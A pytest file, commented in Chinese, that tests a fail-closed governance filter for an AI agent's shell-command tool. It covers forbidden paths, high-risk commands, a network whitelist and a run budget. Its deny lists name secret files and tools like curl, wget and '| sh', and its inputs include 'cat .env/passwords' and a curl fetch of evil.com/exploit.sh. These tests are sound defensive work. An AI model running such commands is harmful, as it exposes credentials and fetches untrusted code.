# tests/test_filter.py —— TDD 测试 Filter 治理层
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

HERE = Path(__file__).resolve().parent
EXAMPLE_DIR = HERE.parent
sys.path.insert(0, str(EXAMPLE_DIR))


class TestPolicyJsonRealLoad:
    """测试 policy.json 真实加载，反 PR138 死文件"""

    def test_load_policy_calls_json_load(self):
        """测试 load_policy 真实调用 json.load"""
        # 这个测试会在实现后通过，当前会失败因为模块还不存在
        from filters.policy import load_policy

        # Mock json.load 来验证它被真实调用了
        with patch("builtins.open") as mock_open:
            mock_file = MagicMock()
            mock_open.return_value.__enter__.return_value = mock_file

            with patch("json.load") as mock_json_load:
                mock_json_load.return_value = {
                    "forbidden_paths": [".env"],
                    "high_risk_commands": ["rm -rf"],
                    "network_whitelist": [],
                    "allowed_executables": ["python"],
                    "max_timeout_sec": 120,
                    "max_output_bytes": 1048576,
                    "max_sandbox_runs": 12
                }

                policy = load_policy("filters/policy.json")

                # 验证 json.load 被真实调用
                mock_json_load.assert_called_once_with(mock_file)
                assert policy["forbidden_paths"] == [".env"]


class TestCommandPolicyEvaluate:
    """测试 CommandPolicy.evaluate 确定性 fail-closed 判定链"""

    def test_forbidden_paths_deny(self):
        """测试禁止路径返回 deny"""
        from filters.policy import CommandPolicy

        policy_data = {
            "forbidden_paths": [".env", ".ssh", "id_rsa", "/etc", ".."],
            "high_risk_commands": ["rm -rf", "sudo", "| sh", ";", "&&", "curl", "wget"],
            "network_whitelist": [],
            "allowed_executables": ["python", "pytest", "ruff", "semgrep", "bandit"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }
        policy = CommandPolicy(policy_data)

        # 测试禁止路径
        decision = policy.evaluate("cat .env/passwords", {"call_index": 0})
        assert decision.decision == "deny"
        assert "禁止路径" in decision.reason
        assert ".env" in decision.reason

    def test_high_risk_commands_needs_review(self):
        """测试高危命令返回 needs_human_review"""
        from filters.policy import CommandPolicy

        policy_data = {
            "forbidden_paths": [".env"],
            "high_risk_commands": ["rm -rf", "sudo", "| sh", ";", "&&", "curl", "wget"],
            "network_whitelist": [],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }
        policy = CommandPolicy(policy_data)

        # 测试高危命令
        decision = policy.evaluate("rm -rf /tmp/test", {"call_index": 0})
        assert decision.decision == "needs_human_review"
        assert "高危命令" in decision.reason
        assert "rm -rf" in decision.reason

    def test_network_whitelist_deny(self):
        """测试非白名单网络域名返回 deny"""
        from filters.policy import CommandPolicy

        policy_data = {
            "forbidden_paths": [],
            "high_risk_commands": [],
            "network_whitelist": ["api.github.com", "pypi.org"],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }
        policy = CommandPolicy(policy_data)

        # 测试非白名单网络域名
        decision = policy.evaluate(
            "curl https://evil.com/exploit.sh", {"call_index": 0}
        )
        assert decision.decision == "deny"
        assert "非白名单网络" in decision.reason
        assert "evil.com" in decision.reason

    def test_budget_exceeded_deny(self):
        """测试超预算沙箱调用返回 deny"""
        from filters.policy import CommandPolicy

        policy_data = {
            "forbidden_paths": [],
            "high_risk_commands": [],
            "network_whitelist": [],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }
        policy = CommandPolicy(policy_data)

        # 测试超预算（修复隐患1前：call_index=13 才 deny）
        # 修复后：call_index=12 即 deny（>= 而非 >）
        decision = policy.evaluate("python test.py", {"call_index": 12})
        msg = f"call_index=12 (max_sandbox_runs) 应该 deny，实际 {decision.decision}"
        assert decision.decision == "deny", msg
        assert "超预算" in decision.reason

        # call_index=11 应该 still allow
        decision = policy.evaluate("python test.py", {"call_index": 11})
        msg = f"call_index=11 (< max_sandbox_runs) 应该 allow，实际 {decision.decision}"
        assert decision.decision == "allow", msg

    def test_allow_command(self):
        """测试允许的命令返回 allow"""
        from filters.policy import CommandPolicy

        policy_data = {
            "forbidden_paths": [],
            "high_risk_commands": [],
            "network_whitelist": [],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }
        policy = CommandPolicy(policy_data)

        # 测试允许的命令
        decision = policy.evaluate("python test.py", {"call_index": 5})
        assert decision.decision == "allow"
        assert decision.reason == ""

    def test_evaluation_order(self):
        """测试判定链执行顺序：禁路径→高危→网络→预算→允许"""
        from filters.policy import CommandPolicy

        policy_data = {
            "forbidden_paths": [".env"],
            "high_risk_commands": ["rm -rf"],
            "network_whitelist": ["safe.com"],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }
        policy = CommandPolicy(policy_data)

        # 测试优先级：禁止路径应该最先触发
        decision1 = policy.evaluate("cat .env | rm -rf", {"call_index": 0})
        assert decision1.decision == "deny"
        assert "禁止路径" in decision1.reason

        # 没有禁止路径时，高危命令应该触发
        decision2 = policy.evaluate("rm -rf /tmp", {"call_index": 0})
        assert decision2.decision == "needs_human_review"
        assert "高危命令" in decision2.reason

    def test_forbidden_path_no_false_match(self):
        """测试禁止路径精确匹配，.environment 不应命中 .env（修复隐患2）"""
        from filters.policy import CommandPolicy

        policy_data = {
            "forbidden_paths": [".env"],
            "high_risk_commands": [],
            "network_whitelist": [],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }
        policy = CommandPolicy(policy_data)

        # .environment 不应该命中 .env（修复隐患2前：会误匹配）
        decision = policy.evaluate("cat .environment/config", {"call_index": 0})
        msg = f".environment 不应命中 .env，实际 {decision.decision}"
        assert decision.decision == "allow", msg

        # .env 应该正确命中
        decision = policy.evaluate("cat .env/passwords", {"call_index": 0})
        msg = f".env 应该命中，实际 {decision.decision}"
        assert decision.decision == "deny", msg

    def test_high_risk_command_boundary_match(self):
        """测试高危命令边界匹配，rm -rf-safe 不应命中 rm -rf（修复隐患2）"""
        from filters.policy import CommandPolicy

        policy_data = {
            "forbidden_paths": [],
            "high_risk_commands": ["rm -rf", "curl", ";", "&&"],
            "network_whitelist": [],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }
        policy = CommandPolicy(policy_data)

        # rm -rf-safe 不应该命中 rm -rf（边界匹配）
        decision = policy.evaluate("rm -rf-safe /tmp", {"call_index": 0})
        msg = f"rm -rf-safe 不应命中 rm -rf，实际 {decision.decision}"
        assert decision.decision == "allow", msg

        # rm -rf 应该正确命中
        decision = policy.evaluate("rm -rf /tmp", {"call_index": 0})
        msg = f"rm -rf 应该命中，实际 {decision.decision}"
        assert decision.decision == "needs_human_review", msg

        # shell 操作符 ; 应该仍然触发（保留子串匹配）
        decision = policy.evaluate("echo hello; echo world", {"call_index": 0})
        msg = f"; 操作符应该触发，实际 {decision.decision}"
        assert decision.decision == "needs_human_review", msg

        # shell 操作符 && 应该触发
        decision = policy.evaluate("cd /tmp && ls", {"call_index": 0})
        msg = f"&& 操作符应该触发，实际 {decision.decision}"
        assert decision.decision == "needs_human_review", msg


class TestCrGovernanceFilter:
    """测试 CrGovernanceFilter BaseFilter 实现"""

    def test_basefilter_before_deny_sets_continue_false(self):
        """测试 BaseFilter _before 对 deny 命令设 is_continue=False"""
        from filters.sdk_filter import CrGovernanceFilter
        from trpc_agent_sdk.abc import FilterResult
        from trpc_agent_sdk.context import AgentContext

        policy_data = {
            "forbidden_paths": [".env"],
            "high_risk_commands": [],
            "network_whitelist": [],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }

        filter_instance = CrGovernanceFilter(policy_data)
        ctx = MagicMock(spec=AgentContext)

        # 模拟一个 skill_run 的工具调用请求
        req = {"tool_name": "skill_run", "command": "cat .env/passwords"}
        rsp = FilterResult()

        # 运行 _before 钩子
        import asyncio
        asyncio.run(filter_instance._before(ctx, req, rsp))

        # 验证 deny 命令导致 is_continue=False
        assert rsp.is_continue is False, "deny 命令应该设置 is_continue=False"

    def test_basefilter_before_allow_continues(self):
        """测试 BaseFilter _before 对 allow 命令保持 is_continue=True"""
        from filters.sdk_filter import CrGovernanceFilter
        from trpc_agent_sdk.abc import FilterResult
        from trpc_agent_sdk.context import AgentContext

        policy_data = {
            "forbidden_paths": [],
            "high_risk_commands": [],
            "network_whitelist": [],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }

        filter_instance = CrGovernanceFilter(policy_data)
        ctx = MagicMock(spec=AgentContext)

        # 模拟一个允许的工具调用请求
        req = {"tool_name": "skill_run", "command": "python test.py"}
        rsp = FilterResult()

        # 运行 _before 钩子
        import asyncio
        asyncio.run(filter_instance._before(ctx, req, rsp))

        # 验证 allow 命令保持 is_continue=True
        assert rsp.is_continue is True, "allow 命令应该保持 is_continue=True"

    def test_basefilter_blocks_non_skill_run_commands(self):
        """测试 BaseFilter 阻断非 skill_run 的命令"""
        from filters.sdk_filter import CrGovernanceFilter
        from trpc_agent_sdk.abc import FilterResult
        from trpc_agent_sdk.context import AgentContext

        policy_data = {
            "forbidden_paths": [],
            "high_risk_commands": [],
            "network_whitelist": [],
            "allowed_executables": ["python"],
            "max_timeout_sec": 120,
            "max_output_bytes": 1048576,
            "max_sandbox_runs": 12
        }

        filter_instance = CrGovernanceFilter(policy_data)
        ctx = MagicMock(spec=AgentContext)

        # 模拟非 skill_run 的工具调用
        req = {"tool_name": "other_tool", "command": "python test.py"}
        rsp = FilterResult()

        # 运行 _before 钩子
        import asyncio
        asyncio.run(filter_instance._before(ctx, req, rsp))

        # 验证非 skill_run 命令被阻断
        assert rsp.is_continue is True, "非 skill_run 命令不应该被 Filter 处理"
